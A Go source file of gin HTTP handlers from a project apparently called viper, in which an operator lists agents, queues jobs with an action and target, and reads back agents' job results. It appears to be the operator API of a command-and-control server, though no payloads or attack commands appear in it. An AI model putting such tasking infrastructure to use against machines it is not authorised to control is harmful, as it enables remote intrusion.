package operator

import (
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/ngn13/viper/server/bridge"
	"github.com/ngn13/viper/server/utils"
)

// returns a list of agents
func GetAgents(c *gin.Context) {
  c.JSON(http.StatusOK, gin.H {
    "error": "",
    "result": bridge.Agents,
  })
}

// returns a list of jobs
func ListJobs(c *gin.Context) {
  jobs := []bridge.JobData{}

  for i := range bridge.Jobs {
    if !bridge.Jobs[i].Done {
      jobs = append(jobs, bridge.Jobs[i])
    }
  } 

  c.JSON(http.StatusOK, gin.H {
    "error": "",
    "result": jobs,
  })
}

// adds a job to the Jobs list
func AddJob(c *gin.Context){
  job := bridge.JobData{}
  c.BindJSON(&job)

  if job.Action == "" || job.Data == "" || job.Target == "" {
    c.JSON(http.StatusBadRequest, utils.ErrorJSON("Bad JSON"))
    return
  }

  job.Done = false
  bridge.Jobs = append(bridge.Jobs, job)

  c.JSON(http.StatusOK, utils.ErrorJSON(""))
}

// lets an operator see the results for a job that runned on 
// a agent
func JobResults(c *gin.Context){
  uid := c.Query("uid")

  if uid == "" {
    c.JSON(http.StatusBadRequest, utils.ErrorJSON("Required parameters not found"))
    return 
  }

  indx := bridge.FindAgent(uid)
  for indx == -1 {
    c.JSON(http.StatusNotFound, utils.ErrorJSON("Provided agent not found"))
    return 
  }

  c.JSON(http.StatusOK, gin.H {
    "error": "",
    "result": bridge.Agents[indx].JobRes,
  })
}
